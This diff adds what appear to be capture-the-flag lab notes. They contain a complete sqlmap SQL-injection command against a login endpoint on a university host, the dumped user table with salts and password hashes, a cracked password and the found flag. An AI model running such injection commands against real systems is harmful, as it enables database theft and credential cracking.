@@ -1,0 +1,23 @@
+sqlmap -u "https://gorila.dsa.linti.unlp.edu.ar/login"   --method=POST   --data='{"username":"YWRtaW4=","password":"admin"}'   --headers="Content-Type: application/json" --batch --tamper=base64encode --level=5 --risk=3 -p username -D public -T usuarios --dump
+
+
+Database: public
+Table: usuarios
+[2 entries]
++----+----------------------------------+----------------------+------------------------------------------------------------------+
+| id | salt                             | username             | password_hash                                                    |
++----+----------------------------------+----------------------+------------------------------------------------------------------+
+| 1  | d2382d03c980d7d5ab8386e72bd640ae | usuarioConClaveDebil | a06e5e3af075abad6738bb0611da2030dc0189ea738480a815602303a95e8ee0 |
+| 2  | 50299d5b4e5ddbdf0b2cea607549a57f | UsuarioSeguro        | 6783920dfcda5efa99cd9183353cf2a421cafccba75905fc93b3aa8b3bf979fd |
++----+----------------------------------+----------------------+------------------------------------------------------------------+
+
+
+
+saltPassComp.py --> princesa
+
+
+¡Felicidades! Has encontrado la flag: 'FLAG{FELICITACIONES}'
+
+
+
+
